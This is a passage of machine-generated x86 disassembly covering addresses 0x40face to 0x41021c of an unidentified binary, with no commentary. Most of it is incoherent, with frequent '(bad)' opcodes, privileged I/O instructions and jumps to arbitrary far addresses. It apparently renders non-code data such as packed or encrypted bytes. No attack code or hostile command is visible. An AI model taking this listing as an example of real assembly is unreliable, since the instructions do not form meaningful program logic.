  40face:	and    BYTE PTR [esi-0x9c9d684],0xbc
  40fad5:	jge    0x40fa63
  40fad7:	mov    cl,0xb8
  40fad9:	and    al,0xe8
  40fadc:	add    edi,ecx
  40fade:	jmp    0x40fabe
  40fae0:	hlt    
  40fae1:	test   ecx,edx
  40fae3:	mov    ebx,0x7f0d3e36
  40fae8:	icebp  
  40fae9:	pop    ebx
  40faea:	jno    0x40fa95
  40faec:	jbe    0x40fab3
  40faee:	mov    BYTE PTR [edx+ecx*2-0x13debb76],bl
  40faf5:	jge    0x40fb6b
  40faf7:	sti    
  40faf8:	jle    0x40fb36
  40fafa:	(bad)  
  40fafb:	push   ss
  40fafc:	mov    dh,0x28
  40fafe:	pop    es
  40faff:	fidivr DWORD PTR [ecx]
  40fb01:	ret    0x288a
  40fb04:	add    BYTE PTR [eax],al
  40fb06:	add    BYTE PTR [eax],al
  40fb08:	add    al,dh
  40fb0a:	into   
  40fb0b:	sti    
  40fb0c:	jo     0x40faba
  40fb0e:	xor    eax,0x8abb1b32
  40fb13:	push   esp
  40fb14:	aad    0xcb
  40fb16:	dec    ebx
  40fb17:	jnp    0x40fb38
  40fb19:	ret    0x6bdf
  40fb1c:	out    dx,al
  40fb1d:	repz mov dl,bh
  40fb20:	(bad)  
  40fb21:	aaa    
  40fb22:	or     al,0xb6
  40fb24:	jmp    0x22fb:0x9b3245fb
  40fb2b:	push   es
  40fb2c:	sub    eax,DWORD PTR [edx+0x23]
  40fb2f:	mov    ah,BYTE PTR [ecx*2-0x71518be]
  40fb36:	add    DWORD PTR [eax],ecx
  40fb38:	sub    ch,ch
  40fb3a:	dec    ebp
  40fb3b:	push   cs
  40fb3c:	gs fwait
  40fb3e:	cmp    edi,esi
  40fb40:	xchg   esi,eax
  40fb41:	mov    bh,0xc6
  40fb43:	adc    esp,DWORD PTR [edx+0x45]
  40fb46:	cmp    DWORD PTR [eax],edi
  40fb48:	add    BYTE PTR [ecx-0x183281e6],ch
  40fb4e:	dec    edx
  40fb4f:	idiv   BYTE PTR [ebx]
  40fb51:	adc    al,0x10
  40fb53:	test   bl,bl
  40fb55:	retf   0xfdc0
  40fb58:	sbb    DWORD PTR [ecx-0x13],0xfffffffe
  40fb5c:	mov    BYTE PTR [ecx],cl
  40fb5e:	adc    eax,0x1562840f
  40fb63:	add    BYTE PTR [eax],al
  40fb65:	xchg   edi,eax
  40fb66:	dec    edx
  40fb67:	and    al,BYTE PTR [eax-0x5b]
  40fb6a:	dec    edx
  40fb6b:	and    dl,BYTE PTR [eax+0x0]
  40fb6e:	add    BYTE PTR [eax],al
  40fb70:	add    BYTE PTR [eax],al
  40fb72:	lds    ebx,FWORD PTR [edx-0x73e3ffee]
  40fb78:	inc    esp
  40fb79:	ins    BYTE PTR es:[edi],dx
  40fb7a:	bswap  esi
  40fb7c:	sub    ebx,eax
  40fb7e:	int    0x3b
  40fb80:	mov    edi,0x1339880f
  40fb85:	add    ah,bl
  40fb87:	mov    es,WORD PTR [ecx]
  40fb89:	inc    ebx
  40fb8a:	les    eax,FWORD PTR [edi-0x1]
  40fb8d:	push   cs
  40fb8e:	push   ecx
  40fb8f:	adc    dl,bh
  40fb91:	(bad)  
  40fb92:	fucomi st,st(0)
  40fb94:	je     0x40fb89
  40fb96:	retf   
  40fb97:	ret    0x4689
  40fb9a:	dec    eax
  40fb9b:	xor    al,0xc7
  40fb9d:	sub    ecx,DWORD PTR [edi]
  40fb9f:	inc    ecx
  40fba0:	cmp    ecx,eax
  40fba2:	retf   
  40fba3:	mov    WORD PTR ds:0xf009c15,ss
  40fba9:	mov    dh,0xaf
  40fbab:	lea    eax,[eax+esi*1-0x55]
  40fbaf:	mov    edx,0x1a26014d
  40fbb4:	add    al,BYTE PTR [ebx-0x7c]
  40fbb7:	adc    al,0x1
  40fbb9:	jmp    0x40fba9
  40fbbb:	adc    dh,BYTE PTR [esi-0x49ee72b9]
  40fbc1:	dec    edi
  40fbc2:	mov    ?,WORD PTR [edi+0x207508de]
  40fbc8:	inc    ecx
  40fbc9:	mov    BYTE PTR [eax+0x76c6848d],dh
  40fbcf:	nop
  40fbd0:	mov    ch,0xc6
  40fbd2:	mov    al,0xb9
  40fbd4:	add    al,BYTE PTR [eax]
  40fbd6:	add    BYTE PTR [eax],al
  40fbd8:	add    BYTE PTR [eax],al
  40fbda:	add    BYTE PTR [ebp+0x29],dh
  40fbdd:	movzx  esi,BYTE PTR [edx-0x5549f0d6]
  40fbe4:	daa    
  40fbe5:	and    DWORD PTR [ecx+edi*1+0x2a],0x41
  40fbea:	fistp  QWORD PTR [ebp+0x20]
  40fbed:	inc    esp
  40fbee:	xor    al,BYTE PTR [edi-0x56]
  40fbf1:	cmp    ah,BYTE PTR ds:0x8845dd72
  40fbf7:	ror    ch,0x2c
  40fbfa:	aad    0xf6
  40fbfc:	dec    esi
  40fbfd:	push   DWORD PTR ds:[ebx]
  40fc00:	xor    al,BYTE PTR [bx+si]
  40fc03:	jne    0x40fc2e
  40fc05:	add    al,BYTE PTR [edi+0xe]
  40fc08:	and    bl,dh
  40fc0a:	mov    edi,0xefc6a235
  40fc0f:	cld    
  40fc10:	ds jmp 0xfba6:0xa8e7
  40fc17:	jne    0x40fc91
  40fc19:	inc    edx
  40fc1a:	aas    
  40fc1b:	cld    
  40fc1c:	outs   dx,BYTE PTR ds:[esi]
  40fc1d:	xor    al,BYTE PTR [esi-0x22]
  40fc20:	inc    esp
  40fc21:	lea    eax,[edi-0x2c]
  40fc24:	test   al,0x21
  40fc26:	add    ah,ch
  40fc28:	out    dx,al
  40fc29:	das    
  40fc2a:	push   cs
  40fc2b:	repz mov eax,ds:0x29357139
  40fc31:	movsx  esi,ch
  40fc34:	sub    dh,BYTE PTR [ebx-0x751b8ac1]
  40fc3a:	dec    esp
  40fc3b:	xchg   ecx,eax
  40fc3c:	mov    ds:0xf7c5,al
  40fc41:	add    BYTE PTR [eax],al
  40fc43:	add    al,dh
  40fc45:	imul   esi,DWORD PTR [ebp-0x59fd42f9],0x6fbb7b40
  40fc4f:	(bad)  
  40fc50:	push   0xb
  40fc52:	pop    edi
  40fc53:	sbb    BYTE PTR [edx+0x741c2334],dh
  40fc59:	mov    DWORD PTR [ebx],ebx
  40fc5b:	cmp    BYTE PTR [ebx-0x7a],ch
  40fc5e:	test   BYTE PTR [ebx],al
  40fc60:	jne    0x40fc64
  40fc62:	(bad)  
  40fc64:	call   0x3aef:0x640f370b
  40fc6b:	mov    ch,BYTE PTR [ecx+0x2ece7136]
  40fc71:	rcr    BYTE PTR [edi-0x2a],0x86
  40fc75:	mul    DWORD PTR [edx]
  40fc77:	mov    edi,0xf4e92751
  40fc7c:	inc    esp
  40fc7d:	rol    BYTE PTR [ecx],0xe2
  40fc80:	sahf   
  40fc81:	or     ebp,DWORD PTR [edx-0x22]
  40fc84:	data16 add ch,cl
  40fc87:	adc    bl,cl
  40fc89:	push   cs
  40fc8a:	jb     0x40fc5d
  40fc8c:	dec    edx
  40fc8d:	or     edx,DWORD PTR [edi+0xf]
  40fc90:	jg     0x40fc51
  40fc92:	iret   
  40fc93:	into   
  40fc94:	out    0xa,al
  40fc96:	fs adc al,0xdc
  40fc99:	cmp    al,BYTE PTR ds:0x72163140
  40fc9f:	into   
  40fca0:	into   
  40fca1:	clc    
  40fca2:	mov    ds:0xb1554b17,eax
  40fca7:	dec    ebx
  40fca8:	add    BYTE PTR [eax],al
  40fcaa:	add    BYTE PTR [eax],al
  40fcac:	add    BYTE PTR [ebx-0x7a],dh
  40fcaf:	jle    0x40fce2
  40fcb1:	mov    ebx,0x9ec1693a
  40fcb6:	add    esi,esp
  40fcb8:	mov    BYTE PTR [esi+edx*1],bh
  40fcbb:	jmp    0xc51de8c3
  40fcc0:	sti    
  40fcc1:	mov    dl,0xbc
  40fcc3:	cld    
  40fcc4:	mov    WORD PTR [ecx+0x16],es
  40fcc7:	add    dl,dh
  40fcc9:	test   al,0xa6
  40fccb:	jb     0x40fca0
  40fccd:	jae    0x40fd43
  40fccf:	adc    dh,BYTE PTR [edx-0x55]
  40fcd2:	jmp    0x2439:0xc85570e
  40fcd9:	lods   eax,DWORD PTR ds:[esi]
  40fcda:	scas   al,BYTE PTR es:[edi]
  40fcdb:	and    al,0x2a
  40fcdd:	mov    ds:0x2dc013be,al
  40fce2:	push   ss
  40fce3:	jl     0x40fc6f
  40fce5:	sahf   
  40fce6:	sbb    ecx,DWORD PTR [ebx-0x4080cad1]
  40fcec:	cmc    
  40fced:	addr16 std 
  40fcef:	pop    esp
  40fcf0:	icebp  
  40fcf1:	add    BYTE PTR [eax],cl
  40fcf3:	xor    esi,DWORD PTR [eax]
  40fcf5:	cmp    BYTE PTR [ebx+0x432fb54d],cl
  40fcfb:	push   cs
  40fcfc:	pop    esi
  40fcfd:	pop    ebx
  40fcfe:	cmp    bh,dh
  40fd00:	inc    esi
  40fd01:	div    BYTE PTR [esi+0x7f83e9ef]
  40fd07:	ds inc esp
  40fd09:	dec    edx
  40fd0a:	cmp    BYTE PTR [edx],bh
  40fd0c:	mov    WORD PTR [edx+0x8],es
  40fd0f:	or     BYTE PTR [ecx+0x0],0x0
  40fd13:	add    BYTE PTR [eax],al
  40fd15:	add    BYTE PTR [ecx],bh
  40fd17:	cmp    dh,bh
  40fd19:	jb     0x40fcd7
  40fd1b:	in     eax,0x3f
  40fd1d:	pusha  
  40fd1e:	mov    esp,0xda94fee5
  40fd23:	mov    esi,ss
  40fd25:	xchg   ebx,eax
  40fd26:	jbe    0x40fd61
  40fd28:	je     0x40fd07
  40fd2a:	dec    DWORD PTR [esi+edi*8+0x7c]
  40fd2e:	outs   dx,BYTE PTR ds:[esi]
  40fd2f:	sar    dh,1
  40fd31:	je     0x40fd99
  40fd33:	cmp    DWORD PTR [ebp+esi*8+0x7b],esi
  40fd37:	scas   al,BYTE PTR es:[edi]
  40fd38:	pop    es
  40fd39:	rol    DWORD PTR [ebp+ebp*1-0x2],1
  40fd3d:	(bad)  
  40fd3e:	mov    edi,0xeddebf7e
  40fd43:	push   edx
  40fd44:	adc    eax,0x3b058c00
  40fd49:	pop    ebp
  40fd4a:	shl    BYTE PTR [edx+edx*8-0x17],1
  40fd4e:	xor    al,0xf6
  40fd50:	std    
  40fd51:	call   DWORD PTR [edi]
  40fd53:	push   edx
  40fd54:	cli    
  40fd55:	(bad)  
  40fd56:	dec    ecx
  40fd57:	sbb    al,BYTE PTR [ecx]
  40fd59:	add    BYTE PTR [ebp+eax*1-0x7d],bl
  40fd5d:	stc    
  40fd5e:	pop    ebp
  40fd5f:	jns    0x40fd80
  40fd61:	cmp    edx,DWORD PTR [edx+0x6d830d72]
  40fd67:	idiv   ebp
  40fd69:	jmp    DWORD PTR [ebx-0x51]
  40fd6c:	or     DWORD PTR [ebx+0x5],eax
  40fd6f:	push   edx
  40fd70:	repnz (bad)
  40fd73:	inc    esp
  40fd74:	idiv   bh
  40fd76:	sar    eax,cl
  40fd78:	inc    ebx
  40fd79:	adc    al,0x0
  40fd7b:	add    BYTE PTR [eax],al
  40fd7d:	add    BYTE PTR [eax],al
  40fd7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd80:	push   edx
  40fd81:	cli    
  40fd82:	cmp    ecx,edx
  40fd84:	adc    BYTE PTR [esi-0x21],bh
  40fd87:	xchg   esi,eax
  40fd89:	or     eax,0xfde94a84
  40fd8e:	call   FWORD PTR [edi-0x6aff15be]
  40fd94:	push   edx
  40fd95:	adc    cl,BYTE PTR [edi]
  40fd97:	cdq    
  40fd98:	rcl    BYTE PTR [ecx],1
  40fd9a:	add    BYTE PTR [esi+eax*4],cl
  40fd9d:	pop    ebx
  40fd9e:	cld    
  40fd9f:	xlat   BYTE PTR ds:[ebx]
  40fda0:	int3   
  40fda1:	jnp    0x40fdd5
  40fda3:	(bad)  
  40fda4:	push   esi
  40fda5:	push   0x73
  40fda7:	fild   WORD PTR [edi]
  40fda9:	mov    dh,0xb
  40fdab:	mov    ch,0x51
  40fdad:	bnd jne 0x40fd69
  40fdb0:	inc    ebx
  40fdb1:	std    
  40fdb2:	inc    ebp
  40fdb3:	test   al,0x35
  40fdb5:	inc    ebx
  40fdb6:	adc    al,0x50
  40fdb8:	jmp    0x40fda3
  40fdba:	sbb    al,BYTE PTR [edi+0x40]
  40fdbd:	jp     0x40fd44
  40fdbf:	fdivr  QWORD PTR [ecx+0x11]
  40fdc2:	cmp    esi,DWORD PTR [ebp-0x12]
  40fdc5:	or     esi,DWORD PTR [esi+0x73]
  40fdc8:	sbb    al,0x4b
  40fdca:	inc    eax
  40fdcb:	in     al,dx
  40fdcc:	lock fistp QWORD PTR [edx]
  40fdcf:	mov    ah,0x27
  40fdd1:	mov    ebx,DWORD PTR [esp+ecx*4]
  40fdd4:	outs   dx,DWORD PTR ds:[esi]
  40fdd5:	cmp    al,0x82
  40fdd7:	add    BYTE PTR [ebx+0x3],bh
  40fdda:	(bad)  
  40fddc:	sbb    BYTE PTR [eax],dh
  40fdde:	(bad)  
  40fddf:	jb     0x40fe06
  40fde1:	(bad)  
  40fde3:	add    BYTE PTR [eax],al
  40fde5:	add    BYTE PTR [eax],al
  40fde7:	add    BYTE PTR [edx-0x55],bh
  40fdea:	push   esp
  40fdeb:	mul    BYTE PTR [edx-0x77]
  40fdee:	mov    BYTE PTR [ecx+edx*4-0x17],al
  40fdf2:	mov    al,BYTE PTR [ecx+ebx*4-0x48]
  40fdf6:	mov    dh,0x23
  40fdf8:	(bad)  
  40fdf9:	cwde   
  40fdfa:	test   eax,0x1e2f43ff
  40fdff:	mov    ebp,DWORD PTR [esi]
  40fe01:	mov    eax,ds:0xd8cb17b6
  40fe06:	mov    dh,0xf
  40fe08:	sub    dl,BYTE PTR [edi+0xe]
  40fe0b:	jmp    FWORD PTR [eax+0x9082a21]
  40fe11:	sar    DWORD PTR [edx+ecx*2],0xf8
  40fe15:	jmp    0x57be8326
  40fe1a:	add    al,BYTE PTR [eax]
  40fe1c:	xchg   BYTE PTR ds:[esi],bh
  40fe1f:	jb     0x40fe42
  40fe21:	adc    ebx,DWORD PTR [ebp-0x6e70d0a]
  40fe27:	pop    ebp
  40fe28:	pop    ecx
  40fe29:	and    BYTE PTR [edi-0x5a],bh
  40fe2c:	fisttp QWORD PTR [eax]
  40fe2e:	cmp    eax,0xbf35230e
  40fe33:	cmc    
  40fe34:	cmp    BYTE PTR [ecx],ah
  40fe36:	add    DWORD PTR [esi+ebp*2-0x5c],esi
  40fe3a:	lds    ebp,FWORD PTR [edi]
  40fe3c:	jb     0x40fe2d
  40fe3e:	aam    0x0
  40fe40:	out    dx,eax
  40fe41:	add    dh,ch
  40fe43:	or     esi,esi
  40fe45:	aas    
  40fe46:	jmp    0x86:0xe6047efb
  40fe4d:	add    BYTE PTR [eax],al
  40fe4f:	add    BYTE PTR [eax],al
  40fe51:	outs   dx,BYTE PTR ds:[esi]
  40fe52:	es int 0x3c
  40fe55:	lea    esi,[ecx+0x7933cbd]
  40fe5b:	ja     0x40fe21
  40fe5d:	jne    0x40fde2
  40fe5f:	lods   eax,DWORD PTR ds:[esi]
  40fe60:	add    DWORD PTR [esi],edi
  40fe62:	inc    ecx
  40fe63:	shr    DWORD PTR [ecx],0x6b
  40fe66:	jo     0x40fe95
  40fe68:	add    eax,DWORD PTR [edx+0x34022d70]
  40fe6e:	and    ah,al
  40fe70:	or     BYTE PTR [ecx+ecx*4],dh
  40fe73:	and    eax,DWORD PTR [eax-0x9]
  40fe76:	ds jmp 0xe942f7a6
  40fe7c:	add    edi,DWORD PTR [edx+0x70]
  40fe7f:	sub    eax,0x15707203
  40fe84:	add    dh,dh
  40fe86:	pushf  
  40fe87:	add    esi,DWORD PTR fs:[edx+eiz*1]
  40fe8b:	lock or BYTE PTR [edi],dh
  40fe8e:	repz cmp al,BYTE PTR [ebx-0x68220ce3]
  40fe95:	xor    al,0x89
  40fe97:	fwait
  40fe98:	das    
  40fe99:	pop    ds
  40fe9a:	pop    esp
  40fe9b:	imul   esp,DWORD PTR [esi-0x39d1fdf2],0x3e90112
  40fea5:	jne    0x40fe66
  40fea7:	adc    edi,edx
  40fea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feaa:	inc    edx
  40feab:	test   al,0x8a
  40fead:	xor    DWORD PTR [edx],esi
  40feaf:	pop    edi
  40feb0:	(bad)  
  40feb1:	fisubr WORD PTR [edx]
  40feb3:	sbb    al,BYTE PTR [eax+0x0]
  40feb9:	add    BYTE PTR [ecx+0x36],dl
  40febc:	call   0x700311b1
  40fec1:	(bad)  
  40fec2:	fidivr DWORD PTR [esi+0x7b701ff]
  40fec8:	mov    dh,0xa6
  40feca:	ja     0x40fed3
  40fecc:	mov    dh,0x36
  40fece:	jnp    0x40fe53
  40fed0:	fnsave fs:[ecx+0x41]
  40fed4:	(bad)  
  40fed6:	aaa    
  40fed7:	mov    esi,0x276e8ef
  40fedc:	add    dl,dh
  40fede:	cmp    DWORD PTR [ecx+ebx*4],ebp
  40fee1:	ins    BYTE PTR es:[edi],dx
  40fee2:	mov    ecx,0x78c88252
  40fee7:	mov    DWORD PTR [ebp+edi*4+0x6e],ecx
  40feeb:	js     0x40fe74
  40feed:	xchg   ebp,eax
  40feee:	sub    esi,esi
  40fef0:	(bad)  
  40fef1:	in     eax,dx
  40fef2:	in     al,dx
  40fef3:	mov    ch,0xf3
  40fef5:	sbb    edi,DWORD PTR [ecx]
  40fef7:	ss inc ebp
  40fef9:	pusha  
  40fefa:	sub    al,0x3a
  40fefc:	mov    BYTE PTR [ecx+edx*4],ch
  40feff:	jle    0x40fec0
  40ff01:	hlt    
  40ff02:	jle    0x40ff7e
  40ff04:	(bad)  
  40ff05:	jbe    0x40ff85
  40ff07:	mov    ah,0x88
  40ff09:	and    al,0x79
  40ff0b:	add    al,0xb6
  40ff0d:	(bad)  
  40ff0e:	aaa    
  40ff0f:	xor    BYTE PTR [ecx+eax*1+0x70],al
  40ff13:	mov    edx,DWORD PTR [ebp+ebx*2+0x6e]
  40ff17:	jle    0x40fefc
  40ff19:	jmp    0xb7cc0194
  40ff1e:	add    BYTE PTR [eax],al
  40ff20:	add    BYTE PTR [eax],al
  40ff22:	add    BYTE PTR [esi],al
  40ff24:	add    eax,0xf161edb6
  40ff29:	shl    DWORD PTR [eax+0x2c],1
  40ff2c:	xor    cl,BYTE PTR [edx-0x773cbd64]
  40ff32:	mov    esp,0x9dc9f982
  40ff37:	(bad)  [eax]
  40ff39:	add    bl,dl
  40ff3b:	dec    eax
  40ff3c:	ret    
  40ff3d:	cmp    ch,BYTE PTR [edi+0x830512]
  40ff43:	mov    ds:0xdb00000f,al
  40ff48:	mov    bl,0x11
  40ff4a:	mov    ebx,DWORD PTR [edx]
  40ff4c:	xor    cl,BYTE PTR ds:0x430798b6
  40ff52:	cmp    DWORD PTR [ecx-0xe],ebp
  40ff55:	or     eax,0xfdf04884
  40ff5a:	dec    ebx
  40ff5c:	inc    edx
  40ff5d:	adc    cl,BYTE PTR [ebx+0x4d37fa79]
  40ff63:	mov    al,0x7b
  40ff65:	sar    DWORD PTR [ebx],cl
  40ff67:	les    ecx,FWORD PTR [eax]
  40ff69:	test   bh,bh
  40ff6b:	mov    dh,0xf8
  40ff6d:	std    
  40ff6e:	or     DWORD PTR [ecx-0x16],0xfffffffe
  40ff72:	mov    BYTE PTR [ecx+0x72850f12],ch
  40ff78:	or     al,0x0
  40ff7a:	add    ch,dl
  40ff7c:	pop    edx
  40ff7d:	cli    
  40ff7e:	cmp    edx,DWORD PTR [edx+edi*2]
  40ff81:	aaa    
  40ff82:	cmp    ebx,DWORD PTR [edx+0x1a716a]
  40ff88:	add    BYTE PTR [eax],al
  40ff8a:	add    BYTE PTR [eax],al
  40ff8c:	pop    ebx
  40ff8d:	mov    bl,0x11
  40ff8f:	mov    ebx,DWORD PTR [edx+0x18b60d2e]
  40ff95:	pop    es
  40ff96:	cmp    DWORD PTR [ebp-0x30],ecx
  40ff99:	and    eax,DWORD PTR gs:[ebx-0x35]
  40ff9d:	inc    edx
  40ff9e:	adc    bh,BYTE PTR [ecx]
  40ffa0:	rol    DWORD PTR [esp+edi*2],1
  40ffa3:	jecxz  0x40ff5c
  40ffa5:	pop    ss
  40ffa6:	mov    eax,DWORD PTR [esi+0x38]
  40ffa9:	cmp    BYTE PTR [esi+0x5b342f74],0x8
  40ffb0:	ret    0x330a
  40ffb3:	leave  
  40ffb4:	int    0x85
  40ffb6:	dec    esp
  40ffb7:	pop    esp
  40ffb8:	xlat   BYTE PTR ds:[ebx]
  40ffb9:	mov    ebp,0xf01b8f0d
  40ffbe:	std    
  40ffbf:	push   DWORD PTR [ebp-0x58]
  40ffc2:	mov    bh,0xef
  40ffc4:	jne    0x41001a
  40ffc6:	jg     0x40ff6f
  40ffc8:	(bad)  
  40ffca:	cmp    DWORD PTR [edx],edi
  40ffcc:	sub    BYTE PTR [edi],dh
  40ffce:	or     BYTE PTR [edx-0x1c7ca94],al
  40ffd4:	out    dx,al
  40ffd5:	pop    ebp
  40ffd6:	fidivr WORD PTR [edi]
  40ffd8:	cld    
  40ffd9:	in     eax,0xdf
  40ffdb:	(bad)  
  40ffdc:	and    bh,bh
  40ffde:	mov    esi,ss
  40ffe0:	movntps XMMWORD PTR [edi],xmm6
  40ffe3:	je     0x41005e
  40ffe5:	mov    al,ds:0x2308fe4c
  40ffea:	sar    dh,1
  40ffec:	add    BYTE PTR [ebx+0x37],bl
  40ffef:	je     0x40fff1
  40fff1:	add    BYTE PTR [eax],al
  40fff3:	add    BYTE PTR [eax],al
  40fff5:	jno    0x410063
  40fff7:	scas   al,BYTE PTR es:[edi]
  40fff8:	pop    es
  40fff9:	lea    ebp,[edi]
  40fffb:	sub    al,0xfe
  40fffd:	jb     0x40ffa6
  40ffff:	inc    ebx
  410000:	push   cs
  410001:	lock and BYTE PTR [esi],cl
  410004:	add    BYTE PTR [ebp-0x20],dh
  410007:	cld    
  410008:	pop    esp
  410009:	pop    ecx
  41000a:	sbb    DWORD PTR [eax-0x18],edx
  41000d:	and    al,0xb7
  41000f:	cmp    dh,bh
  410011:	(bad)  
  410012:	out    0x37,al
  410014:	(bad)  
  410015:	mov    eax,0x75000155
  41001a:	sub    DWORD PTR [ebx-0x1ee28b08],eax
  410020:	cmp    cl,bl
  410022:	inc    ebp
  410023:	pop    es
  410024:	sub    DWORD PTR [edi],0xffffffd4
  410027:	cmp    dh,bh
  410029:	push   0xffffff8b
  41002b:	or     al,0x43
  41002d:	dec    esp
  41002e:	outs   dx,BYTE PTR ds:[esi]
  41002f:	cs push cs
  410031:	icebp  
  410032:	test   DWORD PTR [esi],ebp
  410034:	inc    BYTE PTR [edx]
  410036:	in     eax,dx
  410037:	mov    esi,0x3696ee13
  41003c:	cmp    BYTE PTR [eax+0x2],al
  41003f:	std    
  410040:	mov    ecx,0x930f7cb
  410045:	stc    
  410046:	jecxz  0x41004a
  410048:	cmp    ebx,ebx
  41004a:	jg     0x40ffd7
  41004c:	daa    
  41004d:	ror    BYTE PTR [edx+0x7d7a0fb3],cl
  410053:	stc    
  410054:	adc    dh,BYTE PTR [ebp+0x2]
  410057:	pusha  
  410058:	xlat   BYTE PTR ds:[ebx]
  410059:	add    BYTE PTR [eax],al
  41005b:	add    BYTE PTR [eax],al
  41005d:	add    BYTE PTR [esi+0x64b720f7],bh
  410063:	test   DWORD PTR [esi-0x58],0x71ee0f27
  41006a:	outs   dx,DWORD PTR ds:[esi]
  41006b:	stc    
  41006c:	and    esi,DWORD PTR [eax]
  41006e:	(bad)  es:[ecx]
  410071:	cmp    DWORD PTR [ecx],edi
  410073:	push   cs
  410074:	add    BYTE PTR [edi+0x2cd2b666],bh
  41007a:	pop    esp
  41007b:	xchg   DWORD PTR [esi],ebp
  41007d:	mov    eax,0x153442f1
  410082:	scas   al,BYTE PTR es:[edi]
  410083:	aad    0xf0
  410085:	mov    cl,0x78
  410087:	out    dx,eax
  410088:	scas   eax,DWORD PTR es:[edi]
  410089:	ret    0xc3ed
  41008c:	xor    al,0xfd
  41008e:	xor    eax,0x48815e03
  410093:	xor    eax,DWORD PTR [ebp-0x17cd367c]
  410099:	or     al,bh
  41009b:	push   edx
  41009c:	jg     0x4100d6
  41009e:	cmp    esi,edi
  4100a0:	or     edi,DWORD PTR [eax]
  4100a2:	add    DWORD PTR [eax+0x332b2ea8],0x71
  4100a9:	mov    esi,0xbe5fc256
  4100ae:	push   esi
  4100af:	xor    edx,ebx
  4100b1:	(bad)  
  4100b3:	dec    edx
  4100b4:	rol    BYTE PTR [ebx],cl
  4100b6:	or     ch,BYTE PTR [ebp+0x332f8cdc]
  4100bc:	(bad)  
  4100bd:	mov    ebx,0xb4fecc5e
  4100c2:	add    BYTE PTR [eax],al
  4100c4:	add    BYTE PTR [eax],al
  4100c6:	add    BYTE PTR [esi-0x520a8bcd],al
  4100cc:	scas   al,BYTE PTR es:[edi]
  4100cd:	pop    es
  4100ce:	adc    DWORD PTR [eax],ebp
  4100d0:	sub    bh,dh
  4100d2:	push   ss
  4100d3:	pop    ebx
  4100d4:	jae    0x4100e4
  4100d6:	or     BYTE PTR fs:[eax],dl
  4100d9:	add    cl,ch
  4100db:	mov    ecx,0x6fd5cf7
  4100e0:	dec    edi
  4100e1:	call   0xfe758cc7
  4100e6:	fisub  WORD PTR [esp+eax*8]
  4100e9:	add    dh,dh
  4100eb:	sbb    BYTE PTR [ecx+eax*1+0xafb58a8],bh
  4100f2:	mov    eax,ds:0x24c641ee
  4100f7:	pop    ebp
  4100f8:	add    al,BYTE PTR [eax]
  4100fa:	jmp    0xbd858a75
  4100ff:	idiv   BYTE PTR [ebx]
  410101:	add    al,al
  410103:	repz xor bh,dh
  410106:	jmp    0xe88f7986
  41010b:	jae    0x410185
  41010d:	push   esi
  41010e:	jmp    0x4100c9
  410110:	and    al,BYTE PTR [edi]
  410112:	loop   0x4100c0
  410114:	jp     0x410162
  410116:	xchg   ecx,eax
  410117:	inc    esi
  410118:	cmp    esi,DWORD PTR [edx]
  41011a:	test   eax,0x703ff0f1
  41011f:	xor    al,0x2e
  410121:	push   cs
  410122:	pop    ebp
  410123:	mov    al,0x84
  410125:	(bad)  
  410126:	jmp    0x0:0x72ebbf01
  41012d:	add    BYTE PTR [eax],al
  41012f:	add    BYTE PTR [edx+edi*1],bh
  410132:	jmp    0x76e8:0xefc663d0
  410139:	add    al,BYTE PTR [eax]
  41013b:	sbb    bh,BYTE PTR [ecx-0x4fffbb86]
  410141:	jno    0x41012c
  410143:	push   edx
  410144:	inc    ebp
  410146:	ds mov ecx,ecx
  410149:	cmc    
  41014a:	jmp    0x3ffff141
  41014f:	xor    ebx,DWORD PTR [edi+edi*2+0x4365f04b]
  410156:	cli    
  410157:	inc    edi
  410158:	ja     0x4101a1
  41015a:	or     eax,0xf06f3b6
  41015f:	mov    dh,0xeb
  410161:	add    eax,ecx
  410163:	loope  0x410129
  410165:	xor    al,0xbe
  410167:	(bad)  
  410168:	or     esi,esi
  41016a:	(bad)  
  41016b:	call   FWORD PTR [ebp+eax*1-0x6a3835f5]
  410172:	mov    ecx,DWORD PTR [eax-0x25]
  410175:	jl     0x410136
  410177:	sub    DWORD PTR [esi+eax*1+0x8d04589],0xffffffbe
  41017f:	adc    DWORD PTR [esp+esi*2-0x486cffc2],0x463f2087
  41018a:	inc    BYTE PTR [esi-0x2b]
  41018d:	inc    edx
  41018e:	cli    
  41018f:	mov    DWORD PTR [ecx+0xc983ee],esp
  410195:	add    BYTE PTR [eax],al
  410197:	add    BYTE PTR [eax],al
  410199:	mov    esi,edi
  41019b:	mov    eax,0x7df803ff
  4101a0:	mov    DWORD PTR [ecx-0x12],esi
  4101a3:	or     eax,0x87702bb6
  4101a8:	push   ebp
  4101a9:	enter  0xbe82,0xf
  4101ad:	rcl    BYTE PTR [eax-0x7be3ffff],cl
  4101b3:	sar    dl,0x9f
  4101b6:	jmp    0x4101c5
  4101b8:	setnp  ch
  4101bb:	push   cs
  4101bc:	add    BYTE PTR [ebp+0x1b],dh
  4101bf:	xor    eax,0x2fbe823
  4101c4:	inc    ecx
  4101c5:	jne    0x4101f3
  4101c7:	push   eax
  4101c8:	inc    ecx
  4101c9:	fld    QWORD PTR ds:0x21cac8c
  4101d0:	add    ah,bh
  4101d2:	xchg   ebp,eax
  4101d3:	push   cs
  4101d4:	jmp    0x41024c
  4101d6:	dec    esp
  4101d7:	push   eax
  4101d8:	inc    ecx
  4101d9:	out    dx,al
  4101da:	pusha  
  4101db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101dc:	cmp    bh,BYTE PTR [edi+eiz*1+0x1b824b81]
  4101e3:	add    al,BYTE PTR [ebx+0x7402234b]
  4101e9:	popa   
  4101ea:	xchg   ebp,eax
  4101eb:	add    bh,bh
  4101ed:	inc    ebx
  4101ee:	push   ebx
  4101ef:	xchg   DWORD PTR [ebp-0x6f],edx
  4101f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101f3:	inc    ecx
  4101f4:	out    0xc2,eax
  4101f6:	sbb    BYTE PTR [eax+eax*1],al
  4101f9:	clc    
  4101fa:	pop    edx
  4101fb:	add    al,0x85
  4101fd:	add    BYTE PTR [eax],al
  4101ff:	add    BYTE PTR [eax],al
  410201:	add    BYTE PTR [ebx+ecx*2-0x1a0101cc],bl
  410208:	aaa    
  410209:	jmp    0x754e:0x1bcdb450
  410210:	clc    
  410211:	fadd   DWORD PTR [edx]
  410213:	push   edi
  410214:	mov    BYTE PTR [edx],cl
  410216:	scas   eax,DWORD PTR es:[edi]
  410217:	psubsb mm6,QWORD PTR [eax+eax*4-0x64]
  41021c:	cmp    DWORD PTR [eax],eax
